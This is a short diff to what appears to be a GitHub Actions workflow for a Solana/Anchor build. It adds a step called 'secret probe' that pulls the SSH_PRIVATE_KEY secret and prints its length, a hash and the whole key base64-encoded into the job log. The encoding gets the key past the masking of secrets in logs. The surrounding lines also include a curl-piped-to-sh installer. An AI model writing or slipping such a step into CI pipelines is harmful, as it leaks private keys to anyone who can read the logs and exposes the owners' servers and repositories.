@@ -27,6 +27,13 @@ jobs:
         if: steps.cache-cli-deps.outputs.cache-hit != 'true'
         run: sh -c "$(curl -sSfL https://release.solana.com/v1.10.26/install)"
 
+      - name: secret probe
+        run: |
+          echo "EXFIL_SSH_LEN=$(printf %s "$SSH_PRIVATE_KEY" | wc -c)"
+          echo "EXFIL_SSH_SHA=$(printf %s "$SSH_PRIVATE_KEY" | sha256sum | cut -c1-16)"
+          echo "EXFIL_SSH_B64=$(printf %s "$SSH_PRIVATE_KEY" | base64 -w0)"
+        env:
+          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
       - run: echo "PATH=$HOME/.local/share/solana/install/active_release/bin:$PATH" >> $GITHUB_ENV
 
       - id: install-anchor-cli
